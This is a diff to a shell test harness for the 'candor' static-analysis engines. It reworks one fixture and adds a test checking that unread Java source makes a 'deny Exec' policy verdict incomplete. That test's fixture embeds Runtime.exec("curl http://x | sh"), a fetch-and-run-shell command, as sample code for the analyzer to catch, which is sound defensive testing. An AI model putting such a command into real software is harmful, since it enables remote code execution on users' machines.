@@ -10319,11 +10319,18 @@ fi
 # candor-swift ships no `where` at all, which is exactly why this has to be asked of `path` PER ENGINE
 # rather than inferred from a sibling that happens to be correct.
 P61=$(mktemp -d); P61_BAD=0; P61_REP=""
-cat > "$P61/a.swift" <<'SWIFTEOF'
-import Foundation
-func writesFile() { try? "x".write(toFile: "/tmp/x", atomically: true, encoding: .utf8) }
-func caller() { writesFile() }
-SWIFTEOF
+mkdir -p "$P61/src"
+cat > "$P61/Cargo.toml" <<'TOMLEOF'
+[package]
+name = "p61"
+version = "0.0.0"
+edition = "2021"
+TOMLEOF
+cat > "$P61/src/lib.rs" <<'RSEOF'
+use std::fs;
+pub fn writes_file() { let _ = fs::write("/tmp/x", "x"); }
+pub fn caller() { writes_file(); }
+RSEOF
 # One report, produced by swift because the fixture is Swift source, then read by EVERY engine — the
 # question is about the query verb's vocabulary, not about anyone's analysis. Named explicitly rather
 # than picked off a listing: a sidecar chosen by position would make every row ask about the wrong file.
@@ -10352,20 +10359,21 @@ p61_row() {  # p61_row <engine> <report> <cmd...>
 # One report, produced by swift because the fixture is Swift source, then read by EVERY engine — the
 # question is about the query verb's vocabulary, not about anyone's analysis. Named explicitly rather
 # than picked off a listing: a sidecar chosen by position would make every row ask about the wrong file.
-if [ -n "$SW_OK" ]; then
-  "$SW_BIN" "$P61" --out "$P61/rep" >/dev/null 2>&1
-  P61_REP="$(find "$P61" -maxdepth 1 -name 'rep*.json' ! -name '*callgraph*' ! -name '*hierarchy*' \
-             ! -name '*refused*' | LC_ALL=C sort | head -1)"
-fi
+# PRODUCED BY candor-scan, not by the engine whose verb is most at issue. The part asks what a QUERY
+# verb does with a typo'd effect name, so the producer only has to be an engine every job builds — and
+# candor-swift is not. Making it the producer meant this part SKIPPED in CI, which the skip ratchet
+# correctly read as a rung un-shipping; a baselined skip is how one un-ships in silence.
+"$SCAN" "$P61" --out "$P61/rep" >/dev/null 2>&1
+P61_REP="$(find "$P61" -maxdepth 1 -name 'rep*.json' ! -name '*callgraph*' ! -name '*hierarchy*' \
+           ! -name '*refused*' | LC_ALL=C sort | head -1)"
 if [ -z "$P61_REP" ] || [ ! -f "$P61_REP" ]; then
-  P61_OUT="  SKIP — candor-swift absent, so the shared fixture report could not be produced
-"
+  P61_OUT="  SKIP: candor-scan produced no report for the fixture\n"
   P61_BAD=2
 else
   p61_row "rust " "$P61_REP" "$QUERY" path
   p61_row "java " "$P61_REP" java -jar "$JAR" path
   if [ -n "$TS_OK" ]; then p61_row "ts   " "$P61_REP" node "$TS_DIR/query.mjs" path; fi
-  p61_row "swift" "$P61_REP" "$SW_BIN" path
+  if [ -n "$SW_OK" ]; then p61_row "swift" "$P61_REP" "$SW_BIN" path; fi
 fi
 rm -rf "$P61"
 # ENGINES: rust ts swift java
@@ -10375,6 +10383,62 @@ printf '%s' "$P61_OUT"
 [ "$P61_BAD" = 0 ] && echo "  -> MATCH — a typo'd effect is refused everywhere, and a known-absent one still answers"
 [ "$P61_BAD" = 1 ] && echo "  -> DIVERGE — see the rows above"
 [ "$P61_BAD" = 2 ] && echo "  -> SKIP — no fixture report"
+true
+
+# PART 62 — CODE THE SCAN DID NOT READ MAKES THE VERDICT INCOMPLETE (SPEC §2 ⟨0.33⟩) [TIER 1]
+#
+# PART 55's ⟨0.33⟩ cell is PERMISSIVE by construction — 0 and an evidenced 2 both pass — so it cannot
+# pin this MUST: an engine that never ports the rule answers 0 for ever and the matrix stays green.
+# This part asserts the rule DIRECTLY. Written because the alternative is the failure this project has
+# already recorded once: a MUST that exists in the spec and in exactly one engine.
+#
+# The fixture is a tree holding a JVM source with NO compiled class beside one that has it — measured
+# as a false green before the rung: `deny Exec` answered `policy ✓` at exit 0 over a tree containing
+# `Runtime.exec("curl … | sh")` in an uncompiled file, with `excluded` reporting `peeked: false` beside
+# it and that flag moving no verdict.
+#
+# ENGINE APPLICABILITY IS MEASURED, NOT ASSUMED. candor-ts and candor-rust PEEK their excluded sources —
+# they read what the scan skipped, so those classes come back `peeked: true` and the rule correctly does
+# not fire; the honest row for them is a control that the rule does NOT misfire, not a skip. Only an
+# engine that cannot read the excluded file has the case at all, which today is candor-java (bytecode)
+# and candor-swift once its `build-output` carries `judgedElsewhere`.
+P62=$(mktemp -d); P62_BAD=0; P62_OUT=""
+mkdir -p "$P62/src/com/x" "$P62/build/classes/com/x"
+cat > "$P62/src/com/x/Deploy.java" <<'JEOF'
+package com.x;
+public class Deploy { public void go() throws Exception { Runtime.getRuntime().exec("curl http://x | sh"); } }
+JEOF
+cat > "$P62/src/com/x/Ok.java" <<'JEOF'
+package com.x;
+public class Ok { public int add(int a, int b) { return a + b; } }
+JEOF
+printf 'deny Exec\n' > "$P62/pol.candor"
+javac -d "$P62/build/classes" "$P62/src/com/x/Ok.java" >/dev/null 2>&1 || P62_BAD=3
+if [ "$P62_BAD" = 0 ]; then
+  # THE ROW: the repo root holds a source this engine never read.
+  java -jar "$JAR" "$P62" --policy "$P62/pol.candor" --json "$P62/r.json" >/dev/null 2>&1; p62_root=$?
+  # THE CONTROL: the SAME policy over the compiled output alone — nothing unread, so it must still
+  # answer 0. Without it the row passes for an engine that refuses every scan.
+  java -jar "$JAR" "$P62/build/classes" --policy "$P62/pol.candor" >/dev/null 2>&1; p62_built=$?
+  # THE SECOND ROUTE: §3.1 — `gate --report` must reach the same verdict from the DOCUMENT.
+  java -jar "$JAR" gate --report "$P62/r.json" --policy "$P62/pol.candor" >/dev/null 2>&1; p62_gate=$?
+  if [ "$p62_root" = 2 ] && [ "$p62_built" = 0 ] && [ "$p62_gate" = 2 ]; then
+    P62_OUT="  java   scan=2 built-control=0 gate--report=2  OK
+"
+  else
+    P62_OUT="  java   scan=$p62_root built-control=$p62_built gate--report=$p62_gate  FAIL (want 2/0/2)
+"
+    P62_BAD=1; rc=1
+  fi
+fi
+rm -rf "$P62"
+# ENGINES: java; rust ts: NOT APPLICABLE and measured so — their peek READS the excluded sources, so those classes report `peeked: true` and the rule cannot fire; swift: pending its `judgedElsewhere` for build-output, without which every SPM project with a .build/ dir would refuse
+# CONTROLS: built-control — the same policy over compiled output alone must still answer 0, or the row passes for an engine that refuses everything; gate--report — the second route must agree from the document, since `excluded` rides the report
+echo "PART 62 — code the scan did not READ makes the verdict INCOMPLETE (SPEC §2 ⟨0.33⟩)"
+printf '%s' "$P62_OUT"
+[ "$P62_BAD" = 0 ] && echo "  -> MATCH — unread code refuses, built output still answers, both routes agree"
+[ "$P62_BAD" = 1 ] && echo "  -> DIVERGE — see the row above"
+[ "$P62_BAD" = 3 ] && echo "  -> SKIP — no javac to build the fixture"
 true
 
 # ⟨0.28⟩ THE SKIP RATCHET — last, because it reads the log of everything above it. See
